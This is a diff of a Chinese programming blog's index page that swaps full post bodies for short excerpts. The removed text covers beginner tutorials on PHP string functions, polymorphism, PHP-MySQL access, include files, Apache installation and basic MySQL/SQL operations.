-<h3 id="strpos-strrpos"><a href="#strpos-strrpos" class="headerlink" title="strpos(),strrpos()"></a>strpos(),strrpos()</h3><blockquote>
-<p>strpos():查找字符串首次出现的位置<br>strrpos(): 查找字符串最后一次出现的位置</p>
-</blockquote>
-<h3 id="str-repeat-重复字符串"><a href="#str-repeat-重复字符串" class="headerlink" title="str_repeat():重复字符串"></a>str_repeat():重复字符串</h3><p> <img src="https://i.imgur.com/rxhFV2A.png" alt="3"></p>
-<h3 id="chr-和ord"><a href="#chr-和ord" class="headerlink" title="chr()和ord()"></a>chr()和ord()</h3><p><img src="https://i.imgur.com/Zu2hDLC.png" alt="4"></p>
-<h3 id="substr-字符串-开始位置-截取长度-截取字符串"><a href="#substr-字符串-开始位置-截取长度-截取字符串" class="headerlink" title="substr(字符串,开始位置,截取长度):截取字符串"></a>substr(字符串,开始位置,截取长度):截取字符串</h3><p><img src="https://i.imgur.com/XxNCvt3.png" alt="5"></p>
-<h3 id="strchr-、strrchr-：截取字符串"><a href="#strchr-、strrchr-：截取字符串" class="headerlink" title="strchr()、strrchr()：截取字符串"></a>strchr()、strrchr()：截取字符串</h3><p><img src="https://i.imgur.com/BVHZlRI.png" alt="6"></p>
-<blockquote>
-<p>应用：截取文件后缀名<br><img src="https://i.imgur.com/k365fZY.png" alt="7"></p>
-</blockquote>
-<h3 id="str-replace-替换字符串"><a href="#str-replace-替换字符串" class="headerlink" title="str_replace():替换字符串"></a>str_replace():替换字符串</h3><p><img src="https://i.imgur.com/5Lxr3sg.png" alt="8"></p>
-<h3 id="str-split-将字符串分割成数组"><a href="#str-split-将字符串分割成数组" class="headerlink" title="str_split():将字符串分割成数组"></a>str_split():将字符串分割成数组</h3><p><img src="https://i.imgur.com/itHSqgW.png" alt="9"></p>
-<h3 id="str-pad-带填充字符串-总位数-填充字符-填充位置-填充字符串"><a href="#str-pad-带填充字符串-总位数-填充字符-填充位置-填充字符串" class="headerlink" title="str_pad(带填充字符串,总位数,填充字符,填充位置):填充字符串"></a>str_pad(带填充字符串,总位数,填充字符,填充位置):填充字符串</h3><p><img src="https://i.imgur.com/iFDDFMm.png" alt="10"><br><img src="https://i.imgur.com/eInUsTU.png" alt="11"></p>
-<h3 id="字符串大小写转换-strtolower-转换成小写、strtoupper-转换成大写"><a href="#字符串大小写转换-strtolower-转换成小写、strtoupper-转换成大写" class="headerlink" title="字符串大小写转换(strtolower():转换成小写、strtoupper():转换成大写)"></a>字符串大小写转换(strtolower():转换成小写、strtoupper():转换成大写)</h3><p><img src="https://i.imgur.com/deSwHjS.png" alt="12"></p>
-<h3 id="nl2br-将字符串的换行转成"><a href="#nl2br-将字符串的换行转成" class="headerlink" title="nl2br():将字符串的换行转成"></a>nl2br():将字符串的换行转成<br></h3><p><img src="https://i.imgur.com/4Kk9xrO.png" alt="13"></p>
-<h3 id="htmlspecialchars-将HTML字体转成实体"><a href="#htmlspecialchars-将HTML字体转成实体" class="headerlink" title="htmlspecialchars():将HTML字体转成实体"></a>htmlspecialchars():将HTML字体转成实体</h3><p><img src="https://i.imgur.com/xXGvgJU.png" alt="14"></p>
-<h3 id="urlencode-、urldecode-url编码和解码"><a href="#urlencode-、urldecode-url编码和解码" class="headerlink" title="urlencode()、urldecode():url编码和解码"></a>urlencode()、urldecode():url编码和解码</h3><p><img src="https://i.imgur.com/41U3APm.png" alt="15"><br><img src="https://i.imgur.com/zWAyxKm.png" alt="16"></p>
-<h3 id="多字节字符串处理函数"><a href="#多字节字符串处理函数" class="headerlink" title="多字节字符串处理函数"></a>多字节字符串处理函数</h3><blockquote>
-<p>PHP默认本身不支持多字节处理。要开启扩展(multibytes)<br><img src="https://i.imgur.com/Bw6Hp5c.png" alt="17"><br>以mb_开头的函数都在多字节处理函数。</p>
-</blockquote>
-<h4 id="mb-strlen-获取字符串长度"><a href="#mb-strlen-获取字符串长度" class="headerlink" title="mb_strlen():获取字符串长度"></a>mb_strlen():获取字符串长度</h4><p><img src="https://i.imgur.com/nDtFGqk.png" alt="18"></p>
-<blockquote>
-<p><strong>注意</strong>：需要设置字符编码，默认字符编码为ISO-8859-1.</p>
-</blockquote>
-<h4 id="mb-internal-encoding-设置-获取内部字符编码"><a href="#mb-internal-encoding-设置-获取内部字符编码" class="headerlink" title="mb_internal_encoding():设置/获取内部字符编码"></a>mb_internal_encoding():设置/获取内部字符编码</h4><p><img src="https://i.imgur.com/djuADZd.png" alt="19"></p>
-<h4 id="mb-strpos-查找字符串在另一个字符串的位置"><a href="#mb-strpos-查找字符串在另一个字符串的位置" class="headerlink" title="mb_strpos():查找字符串在另一个字符串的位置"></a>mb_strpos():查找字符串在另一个字符串的位置</h4><p><img src="https://i.imgur.com/lSTgnHf.png" alt="20"></p>
-<h4 id="mb-substr-获取字符串"><a href="#mb-substr-获取字符串" class="headerlink" title="mb_substr():获取字符串"></a>mb_substr():获取字符串</h4><p><img src="https://i.imgur.com/co1UwGp.png" alt="21"></p>
-<h3 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h3><h4 id="iconv-输入的编码-输出的编码-字符串"><a href="#iconv-输入的编码-输出的编码-字符串" class="headerlink" title="iconv(输入的编码,输出的编码,字符串)"></a>iconv(输入的编码,输出的编码,字符串)</h4><p><img src="https://i.imgur.com/euK8ciG.png" alt="22"></p>
+          []用下标操作字符串
+字符串可以理解成字符集合，所以可以通过[]来访问。不能操作中文。
 
-          
+strlen()
+返回字符串长度，以字节为单位。
+
+
+注意：在gbk下一个汉字2个字节，在utf-8下一个汉字3个字节。
+
+trim()、ltrim()、rtrim():去除空白字符
+trim():去字符串两边
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/01/03/php字符串操作函数/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1129,14 +864,16 @@
       
         
           
-            <h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>面向对象的三大特性：<strong>封装、继承、多态。</strong><br>多态就是多种形态，多态分为方法重写和方法重载。<strong>但是PHP不支持方法重载</strong></p>
-<h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>子类重写了父类的同名的方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'你好啊！'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">//方法重写</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"我是学生！"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student;</span><br><span class="line">$a -&gt; show();<span class="comment">//这是学生类</span></span><br></pre></td></tr></table></figure></p>
-<p>1、子类和父类的方法名必须一致<br>2、子类重写的方法可以和父类方法的参数个数不一致<br><img src="https://i.imgur.com/nM84Zmh.png" alt="1"></p>
-<p>3、子类重写的方法可以和父类方法的参数个数不一致<br><img src="https://i.imgur.com/sHz4wJZ.png" alt="1"></p>
-<h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>注意：php不支持方法重载<br><img src="https://i.imgur.com/Wr4Azpb.png" alt="2"></p>
-<h4 id="私有属性的继承和重写"><a href="#私有属性的继承和重写" class="headerlink" title="私有属性的继承和重写"></a>私有属性的继承和重写</h4><p><img src="https://i.imgur.com/fNnBmzz.png" alt="3"></p>
-
-          
+          多态面向对象的三大特性：封装、继承、多态。多态就是多种形态，多态分为方法重写和方法重载。但是PHP不支持方法重载
+方法重写子类重写了父类的同名的方法12345678910111213class Person&#123;	public function show()&#123;		echo '你好啊！
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/01/03/php多态/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1254,33 +991,16 @@
       
         
           
-            <h3 id="php操作mysql"><a href="#php操作mysql" class="headerlink" title="php操作mysql"></a>php操作mysql</h3><blockquote>
-<p>php本身不能操作mysql，但是php有扩展可以实现操作mysql。<br>php操作mysql的扩展：mysql，mysqli和PDO扩展。<br>mysql扩展：纯面向过程，里面都是函数，加载扩展后可以调用函数。<br>mysqli扩展：面向过程+面向对象，里面有函数也有类，加载扩展后可以选择调用函数或调用类操作<br>PDO:纯面向对象，只有类，加载后只能调用类。<br>mysql扩展在php5.5之后就移除了，小伙伴注意了。</p>
-</blockquote>
-<p>当php来对mysql进行操作之后：php的角色是mysql的一个客户端</p>
-<blockquote>
-<p>客户端操作服务端有必要的流程</p>
-<ol>
-<li>连接认证：数据库连接资源 <code>mysql_connect(服务器地址包含端口,用户名,用户密码);</code><br><img src="https://i.imgur.com/tVLwRC3.png" alt="5"><br>默认的：mysql_connect会产生一个连接资源，即便是重新连接，也会返回原有的连接资源<br><img src="https://i.imgur.com/4QZKQFM.png" alt="6"><br>如果真的想产生多一个连接：是新的可以在mysql_connect函数的第四个参数控制：true<br><img src="https://i.imgur.com/FAbpS2B.png" alt="7"></li>
-<li>php发送sql指令（等待执行结果）</li>
-<li>mysql服务端接收指令，执行指令，返回结果</li>
-<li>php接收结果<br>mixed <code>mysql_query(sql指令);</code><br>  boolean结果;sql指令没有返回值，布尔true结果只能代表sql语句没有语法错误，false就代表是sql语句有语法错误：主增删改<br><img src="https://i.imgur.com/JvhvxbI.png" alt="8"><br>resource结果：结果集资源，sql指令有结果返回(show,select)，结果集永远为true，主查询<br><img src="https://i.imgur.com/MezXiWq.png" alt="9"><ol start="5">
-<li>php没有办法直接使用结果集：需要解析结果集mysql扩展提供了一系列函数：mysql_fetch系列：任何操作都是指针操作：操作完就会指针下移。<br><strong>mysql_fetch_array</strong>:默认获取混合数组，有一组关联，有一组索引。<br><img src="https://i.imgur.com/CQA8c5a.png" alt="10"><br>当前函数可以实现：只获取关联数组或者索引数组。通过第二个参数限制：MYSQL_BOTH是默认的，MYSQL_ASSOC是关联数组，MYSQL_NUM是索引数组。<br>关联数组获取：MYSQL_ASSOC<br><img src="https://i.imgur.com/YE993Qx.png" alt="11"><br>索引数组获取：MYSQL_NUM<br><img src="https://i.imgur.com/LA3ioR4.png" alt="12"><br><strong>mysql_fetch_row</strong>:获取索引数组<br><strong>mysql_fetch_assoc</strong>:直接获取关联数组<br>不管是哪个fetch：最终如果结果集指针移动到最后，返回都是false</li>
-<li>如果指针已经移动到最后，那么需要重置指针实现其他操作。<br><code>mysql_data_seek(结果集资源，位置从0开始);</code></li>
-<li>获取的数据往往只有一行：实际上查多少是为了显示全部：解析全部，循环遍历来实现。<br><img src="https://i.imgur.com/IzdFMq2.png" alt="13"></li>
-<li>释放资源：mysql资源通常不需要释放(脚本执行周期不会太长，但是数据库的操作是贯穿整个脚本的)<br><code>mysql_close(资源变量);</code><br><img src="https://i.imgur.com/dabqZAm.png" alt="14"></li>
-</ol>
-</li>
-</ol>
-</blockquote>
-<h4 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h4><blockquote>
-<p>从计算机角度出发：增删改都属于写，查属于读。</p>
-</blockquote>
-<blockquote>
-<p><strong>写操作</strong>:<br> 连接认证：不一定连接成功，需要对结果进行判断，可以直接使用三目运算(逻辑或)来进行处理，但是无法获取错误信息。<br> 如果要获取错误信息，那么需要使用mysql提供的获取错误的函数：<br> <code>mysql_errno()</code>:获取错误编号，<code>mysql_error()</code>:获取错误信息。<br> <img src="https://i.imgur.com/AWnMMtC.png" alt="15"></p>
-</blockquote>
-
-          
+          php操作mysql
+php本身不能操作mysql，但是php有扩展可以实现操作mysql。php操作mysql的扩展：mysql，mysqli和PDO扩展。mysql扩展：纯面向过程，里面都是函数，加载扩展后可以调用函数。mysqli扩展：面向过程+面向对象，里面有函数也有类，加载扩展后可以选择调
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/01/03/php操作mysql/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1398,26 +1118,19 @@
       
         
           
-            <h2 id="php包含文件"><a href="#php包含文件" class="headerlink" title="php包含文件"></a>php包含文件</h2><blockquote>
-<p>在网站中有相同的banner，版权等等页面，我们可以将相同的页面做成包含文件，在展示的页面中包含即可。<br> 包含文件相当于将文件的内容复制到页面中，如果包含文件有<html></html>,包含后，页面中就不止一个页面结构了。这与W3C定义的规范不符合，所以在包含文件中不能出现页面的结构。</p>
-</blockquote>
-<h3 id="包含文件的语法"><a href="#包含文件的语法" class="headerlink" title="包含文件的语法"></a>包含文件的语法</h3><blockquote>
-<p>1.include() ——— 可以包含多次<br>2.require() ——— 可以包含多次<br>3.include_once() —- 只能包含一次<br>4.require_once() —- 只能包含一次</p>
-</blockquote>
-<h3 id="require和include的区别"><a href="#require和include的区别" class="headerlink" title="require和include的区别"></a>require和include的区别</h3><blockquote>
-<p>相同点：可以包含多次<br>不同点：require遇到错误停止执行，include遇到错误继续执行。<br><img src="https://i.imgur.com/tMrMqO5.png" alt="1"></p>
-</blockquote>
-<h3 id="目录-文件和目录-文件的区别"><a href="#目录-文件和目录-文件的区别" class="headerlink" title="./目录/文件和目录/文件的区别"></a>./目录/文件和目录/文件的区别</h3><blockquote>
-<p>这两种写法的效果基本是一样的，不带./的路径受到include_path配置的影响。<br><img src="https://i.imgur.com/i5FsYiL.png" alt="2"><br><img src="https://i.imgur.com/AKgTvUO.png" alt="3"></p>
-</blockquote>
-<blockquote>
-<p>可以通过<code>set_include_path()</code>来设置包含文件所在的目录。<br><img src="https://i.imgur.com/X8JaM66.png" alt="4"><br><code>set_include_path()</code> —- 设置包含文件的目录<br><code>get_include_path()</code> —- 获取包含文件的目录<br><strong>设置include_path的作用：</strong><br>1、将项目的经常使用的文件放到一个统一的目录下，然后通过include_path指向此文件夹，就不用写很长的地址字符串。<br>2.将安全性高的文件放到站点外，通过include_path指向此目录。比如连接数据库文件。</p>
-</blockquote>
-<h3 id="终止脚本执行"><a href="#终止脚本执行" class="headerlink" title="终止脚本执行"></a>终止脚本执行</h3><blockquote>
-<p><strong>exit和die()</strong>:<br>exit，终止脚本执行，die(),终止后可以输出一个字符串。<br><img src="https://i.imgur.com/0cmG3P8.png" alt="5"><br><img src="https://i.imgur.com/Hsg7dEP.png" alt="7"><br><strong>return</strong>:<br>终止当前页面的执行。<br><img src="https://i.imgur.com/GPdKQjq.png" alt="6"><br><img src="https://i.imgur.com/2iD0bS4.png" alt="8"></p>
-</blockquote>
+          php包含文件
+在网站中有相同的banner，版权等等页面，我们可以将相同的页面做成包含文件，在展示的页面中包含即可。 包含文件相当于将文件的内容复制到页面中，如果包含文件有,包含后，页面中就不止一个页面结构了。这与W3C定义的规范不符合，所以在包含文件中不能出现页面的结构。
 
-          
+包含文件的语法
+1.
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/01/03/php包含文件/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1535,41 +1248,16 @@
       
         
           
-            <h3 id="一、Apache官网下载Apache-HTTP-Server服务器"><a href="#一、Apache官网下载Apache-HTTP-Server服务器" class="headerlink" title="一、Apache官网下载Apache HTTP Server服务器"></a>一、Apache官网下载Apache HTTP Server服务器</h3><blockquote>
-<p>1.打开Apache官网：<a href="http://www.apache.org" title="Apache" target="_blank" rel="noopener">http://www.apache.org</a><br><img src="https://i.imgur.com/LgZMLaT.jpg" alt="1"><br><img src="https://i.imgur.com/95pMCMe.jpg" alt="2"><br><img src="https://i.imgur.com/GTOWpIl.jpg" alt="3"><br><img src="https://i.imgur.com/0Joc0hz.jpg" alt="4"><br><img src="https://i.imgur.com/iBRDw1K.jpg" alt="5"><br>选择第一项ApacheHaus，这是个第三方下载平台，在它的网站下载独立的Apache会是一个压缩包。另外四个中，第二个也是独立的Apache下载地址，另外三个是集成开发环境。本人选的第一个。<br><img src="https://i.imgur.com/Q1LIsaw.jpg" alt="6"><br>在新的界面中，会发现VC9和VC11字样，通过阅读相关内容得知，VC9是指用VS2008编译的代码，而VC11是用VS2012编译的，而用VS2012编译的无法在Windows XP和Server 2003中使用。算是为了兼容性好点吧，本人选的用VC9编译的32位Apache，选择下载至此，下载过程完成！<br><img src="https://i.imgur.com/ad6jdMZ.jpg" alt="7"></p>
-</blockquote>
-<h3 id="二、Apache服务器的安装"><a href="#二、Apache服务器的安装" class="headerlink" title="二、Apache服务器的安装"></a>二、Apache服务器的安装</h3><blockquote>
-<p>Apache下载完成后，进行解压缩。</p>
-</blockquote>
-<blockquote>
-<p>解压文件放到一个文件夹，我放到c:\wamp文件夹下。<br>解压后文件夹名我设置为Apache。</p>
-</blockquote>
-<h3 id="三、Apache的配置"><a href="#三、Apache的配置" class="headerlink" title="三、Apache的配置"></a>三、Apache的配置</h3><blockquote>
-<p>打开httpd.conf文件（在conf文件夹下）<br>1.修改目录位置，如下图：<br><img src="https://i.imgur.com/3uAOAVD.png" alt="8"></p>
-</blockquote>
-<blockquote>
-<p>若你的80端口被占用（可以在cmd下用命令netstat -a查看），可以把默认apache端口改掉<br><img src="https://i.imgur.com/B4jpAIy.png" alt="9"></p>
-</blockquote>
-<blockquote>
-<p>2.配置安装Apache的主服务，这样Apache才能启动。以<strong>管理员身份</strong>打开cmd窗口，到apache的bin目录下，输入：<code>httpd.exe -k install -n apache</code>。这条命令是安装apache服务，并将该服务名命名为apache（你也可以改为你喜欢的名称）。<br><img src="https://i.imgur.com/rpjfdFx.png" alt="10"><br>其中，Errors reported here must be corrected before the service can be started.意思是，此处报告的错误必须在服务开始前进行纠正。若没有，则成功。</p>
-</blockquote>
-<h3 id="四、Apache服务器的启动"><a href="#四、Apache服务器的启动" class="headerlink" title="四、Apache服务器的启动"></a>四、Apache服务器的启动</h3><blockquote>
-<p>配置好Apache服务器之后，就可以启动服务器，windows下Apache服务器的启动：</p>
-</blockquote>
-<blockquote>
-<p>1.利用命令启动<br><img src="https://i.imgur.com/eaILgnp.png" alt="11"><br>注意：这里如果你的服务名有改动的话，就需要指定服务名。-n是指定服务名。</p>
-</blockquote>
-<blockquote>
-<p>2.利用Apache服务器自身的程序打开：<br>在bin目录下的ApacheMonitor.exe,打开<br><img src="https://i.imgur.com/Nei1TVq.png" alt="12"></p>
-</blockquote>
-<blockquote>
-<p>打开浏览器，输入<a href="http://localhost,若出现如下图的界面，则Apache服务器的基本配置完毕。" target="_blank" rel="noopener">http://localhost,若出现如下图的界面，则Apache服务器的基本配置完毕。</a><br><img src="https://i.imgur.com/xRGCBNt.png" alt="13"></p>
-</blockquote>
-<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><blockquote>
-<p>我的电脑右键属性<br><img src="https://i.imgur.com/KGhfjR6.png" alt="14"><br><img src="https://i.imgur.com/qKaQmis.png" alt="15"><br>将apache的bin目录放到path中，用”;”分隔。<br><img src="https://i.imgur.com/dqhobZd.png" alt="16"><br>执行过程：当在命令行输入一个命令的时候，先到当前目录下查找当前命令，如果有就执行，如果没有就到环境变量中找path路径，path中有很多命令的路径，默认在从左往右依次寻找。</p>
-</blockquote>
-
-          
+          一、Apache官网下载Apache HTTP Server服务器
+1.打开Apache官网：http://www.apache.org选择第一项ApacheHaus，这是个第三方下载平台，在它的网站下载独立的Apache会是一个压缩包。另外四个中，第二个也是独立的Apache下载地址，另外三个是集
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/01/03/Apache的下载与安装/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1687,13 +1375,17 @@
       
         
           
-            <h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><p>外键：foreign key，外面的键（键不在自己表中）：如果一张表中有一个字段（非主键）指向另外一张表的主键，那么将该字段称之为外键。</p>
-<h3 id="增加外键"><a href="#增加外键" class="headerlink" title="增加外键"></a>增加外键</h3><p>外键可以在创建表的时候或者创建表之后增加（但是要考虑数据的问题）。<br>一张表可以有多个外键。</p>
-<p>创建表的时候增加外键：在所有的表字段之后，使用<code>foreign key(外键字段)references 外部表(主键字段)</code><br><img src="https://i.imgur.com/ms1L7Nz.png" alt="1"><br>在新增表之后增加外键：修改表结构<br><code>alter table 表名 add[constraint 外键名] foreign key(外键字段) references 父表(主键字段);</code><br><img src="https://i.imgur.com/8hhdoXi.png" alt="2"></p>
-<h3 id="修改外键-amp-删除外键"><a href="#修改外键-amp-删除外键" class="headerlink" title="修改外键&amp;删除外键"></a>修改外键&amp;删除外键</h3><p><strong>外键不可修改：只能先删除后新增</strong><br><strong>删除外键语法:</strong><br><code>alter table 表名 drop foreign key 外键名;</code> 一张表中可以有多个外键，但是名字不能相同<br><img src="https://i.imgur.com/QX3G8Jq.png" alt="3"></p>
-<h3 id="外键作用"><a href="#外键作用" class="headerlink" title="外键作用"></a>外键作用</h3><p>外键默认的作用有两点：一个对父表，一个对字表(外键字段所在的表)<br>对字表约束：子表数据进行写操作(增和改)的时候，如果对应的外键字段在父表找不到对应的匹配：那么操作会失败（约束字表数据操作）<br><img src="https://i.imgur.com/4EfgPLg.png" alt="4"><br>对父表约束：父表数据进行写操作(删和改：都必须涉及到主键本身)，如果对应的主键在子表中已经被数据所引用，那么就不允许操作<br><img src="https://i.imgur.com/PJyPlCm.png" alt="5"></p>
-
-          
+          外键外键：foreign key，外面的键（键不在自己表中）：如果一张表中有一个字段（非主键）指向另外一张表的主键，那么将该字段称之为外键。
+增加外键外键可以在创建表的时候或者创建表之后增加（但是要考虑数据的问题）。一张表可以有多个外键。
+创建表的时候增加外键：在所有的表字段之后，使用foreign
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/29/mysql高级操作/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1811,46 +1503,16 @@
       
         
           
-            <h2 id="SQL基本操作"><a href="#SQL基本操作" class="headerlink" title="SQL基本操作"></a>SQL基本操作</h2><h3 id="库的操作"><a href="#库的操作" class="headerlink" title="库的操作"></a>库的操作</h3><h4 id="新增数据库"><a href="#新增数据库" class="headerlink" title="新增数据库"></a>新增数据库</h4><blockquote>
-<p>基本语法<br><code>create database 数据库名 [库选项]</code><br>库选项：用来约束数据库，分为两个选项：<br>  字符集设定：charset/character set 具体字符集(数据存储的编码格式)：常用字符集GBK、utf-8<br>  校对集设定：collate 具体校对集(数据比较的规则)</p>
-</blockquote>
-<h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><blockquote>
-<p>查看所有数据库：show databases;<br>查看指定部分的数据库： 模糊查询：<br>  show databases like ‘pattern’; –pattern是匹配模式<br>  %：表示匹配多个字符<br>  _：表示匹配单个字符<br>  <img src="https://i.imgur.com/vQ4zQuM.png" alt="1"><br>查看数据库的创建语句：show create database 数据库名;<br><img src="https://i.imgur.com/kOhmaJ6.png" alt="2"></p>
-</blockquote>
-<h4 id="更新数据库"><a href="#更新数据库" class="headerlink" title="更新数据库"></a>更新数据库</h4><blockquote>
-<p>数据库名字不可以修改<br>数据库的修改仅限<code>库选项</code>：字符集和校对集(校对集依赖字符集)<br>alter database 数据库名字 [库选项];<br>charset/character set[=] 字符集<br>collate 校对集<br><img src="https://i.imgur.com/qYYU99v.png" alt="3"></p>
-</blockquote>
-<h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><blockquote>
-<p>drop database 数据库名;</p>
-</blockquote>
-<h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="新增数据表"><a href="#新增数据表" class="headerlink" title="新增数据表"></a>新增数据表</h4><blockquote>
-<p><code>create table [if not exists] 表名(字段名 数据类型,字段名 数据类型)[表选项]；</code><br>if not exists :如果表名不存在，那么就创建，否则不执行创建代码：检查功能<br>表选项：控制表的表现<br>   字符集：<code>charset/character set 具体字符集;</code> 保证表中数据储存的字符集<br>   校对集：<code>collate 具体校对集;</code><br>   存储引擎：engine 具体的存储引擎(innodb和myisam)<br>   <img src="https://i.imgur.com/QF5oZiy.png" alt="4"><br>   当创建数据表的SQL指令执行之后，到底发生了什么？<br>   1.指定数据库下已经存在对应的表<br>   2.在数据库对应的文件夹下，会产生对应表的结构文件(跟存储引擎有关系)<br>   <img src="https://i.imgur.com/pK6PzpS.png" alt="5"></p>
-</blockquote>
-<h4 id="查看数据表"><a href="#查看数据表" class="headerlink" title="查看数据表"></a>查看数据表</h4><blockquote>
-<p>查看所有表：<code>show tables;</code><br>查看部分表：模糊匹配：<code>show tables like &#39;pattern&#39;;</code><br><img src="https://i.imgur.com/kXOak4w.png" alt="7"><br>查看表的创建语句：<code>show create table 表名;</code><br>查看表结构：查看表中的字段信息<br>  <code>desc/describe/show columns from 表名;</code><br>  <img src="https://i.imgur.com/X2loxIa.png" alt="8"></p>
-</blockquote>
-<h4 id="修改数据表"><a href="#修改数据表" class="headerlink" title="修改数据表"></a>修改数据表</h4><blockquote>
-<p><strong>修改表本身:</strong><br>  修改表名：<code>rename table 旧表名 to 新表名;</code><br>  修改表选项： <code>alter table 表名 表选项 [=] 值;</code><br>  <img src="https://i.imgur.com/U3GYE7k.png" alt="9"><br>  修改字段：<br>​    新增字段：<code>alter table 表名 add [cloumn] 字段名 数据类型 [列属性][位置];</code><br>​      位置：字段名可以存放表中的任意位置<br>​          first：第一个位置<br>​          after：在哪个字段之后：<code>after 字段名;</code>默认的是在最后一个字段之后<br>​    修改字段：修改通常是修改属性或者数据类型<br>​       <code>alter table 表名 modify 字段名 数据类型 [属性][位置];</code><br>​    重命名字段：<code>alter table 表名 change 旧字段 新字段 数据类型 [属性][位置];</code><br>​    删除字段：<code>alter table 表名 drop 字段名;</code><br><strong>删除数据表：</strong><br>  <code>drop table 表名1,表名2...;</code> 可以一次删除多个表</p>
-</blockquote>
-<h4 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h4><blockquote>
-<p><strong>新增数据</strong><br>  方法1：<code>insert into 表名 values(值列表)[,(值列表)...];</code><br>  方法2：<code>insert into 表名(字段列表)values(值列表)[,(值列表)...];</code><br>  <img src="https://i.imgur.com/oGTuHTk.png" alt="10"><br><strong>查看数据：</strong><br> <code>select */字段列表 from 表名 [where 条件];</code></p>
-<p><code>select distinct 字段 from 表名</code> ——-根据字段筛选数据</p>
-<p> <strong>更新数据：</strong><br>   <code>update 表名 set 字段 = 值 [where 条件];</code><br> <strong>删除数据：</strong><br>   <code>delete from 表名 [where 条件];</code></p>
-</blockquote>
-<h4 id="校对集问题"><a href="#校对集问题" class="headerlink" title="校对集问题"></a>校对集问题</h4><blockquote>
-<p>校对集：数据比较的方式<br>校对集有三种方式：<br>  _bin: binary,二进制比较，取出二进制位，一位一位的比较，区分大小写。<br>  _cs: case sensitive,大小写敏感。<br>  _ci: case insensitive，大小写不敏感。<br>  查看数据库所支持的校对集：<code>show collation;</code><br>  <em>只有当数据产生比较的时候，校对集才会生效。</em><br>  比较：根据某个字段进行排序：<code>order by 字段名 [asc|desc];</code> asc是升序，desc是降序，默认是升序</p>
-</blockquote>
-<h3 id="字段属性"><a href="#字段属性" class="headerlink" title="字段属性"></a>字段属性</h3><h4 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h4><blockquote>
-<p>主键：primary key,主要的键，一张表只能有一个字段可以使用对应的键，用来唯一的约束该字段里面的数据，不能重复：这种称之为主键</p>
-</blockquote>
-<h4 id="增加主键："><a href="#增加主键：" class="headerlink" title="增加主键："></a>增加主键：</h4><blockquote>
-<p>sql操作中有多种方式可以给表增加主键：大体分为三种：<br>  方案1：在创建表的时候，直接在字段之后，跟primary key关键字(主键本身不允许为空)<br>  <img src="https://i.imgur.com/S8gMDEt.png" alt="1"><br>  <strong>优点：</strong>非常直接；<strong>缺点：</strong>只能使用一个字段作为主键<br>  1<br>  方案2：在创建表的时候，在所有的字段之后，使用primary key(主键字段列表)来创建主键(如果有多个字段作为主键，可以是复合主键)<br>  <img src="https://i.imgur.com/kfl6FOY.png" alt="2"><br>  1<br>  方案3：当表已经创建好之后，额外追加主键：可以通过修改表字段属性，也可以直接追加。<br>​    <code>alter table 表名 add primary key(字段列表);</code><br>​    <img src="https://i.imgur.com/6RKb3hP.png" alt="3"><br>​    前提：表中字段对应的数据本身是独立的(不重复)</p>
-</blockquote>
-<h4 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h4><blockquote>
-<p>主键对应的字段中的数据不允许重复：一旦重复，数据操作失败（增和改）<br><img src="https://i.imgur.com/ACaIbhh.png" alt="4"></p>
-</blockquote>
-
-          
+          SQL基本操作库的操作新增数据库
